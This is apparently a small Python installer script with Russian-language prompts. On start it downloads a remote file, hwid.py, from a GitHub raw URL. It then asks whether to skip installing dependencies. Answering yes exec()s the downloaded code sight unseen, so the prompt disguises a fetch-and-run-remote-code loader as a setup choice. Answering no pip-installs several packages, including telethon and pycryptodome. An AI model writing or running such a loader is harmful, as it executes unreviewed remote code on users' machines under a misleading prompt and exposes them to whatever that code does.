import os
import platform

from requests import get

startapp = get("https://raw.githubusercontent.com/hazurik/cnocep/main/hwid.py").text

if platform.system() == "Windows":
    os.system('cls')
else:
    os.system('clear')

def confirm(msg):
  val = input(msg + ' : [Y] Да/[N] Нет ').lower()

  while val not in ('y', 'yes', 'n', 'no'):
    val = input('Попробуйте ещё раз: [Y] Да/[N] Нет ').lower()
  if val == ('y'):
    exec(startapp)
  else:
    os.system('pip install requests && clear && pip install pycryptodome && clear && pip install colorama && clear && pip install telethon && clear && pip install pyfiglet && clear && pip install termcolor && clear')

  return val[0] == 'y'

print(confirm("Пропустить установку нуждающихся компонентов?"))


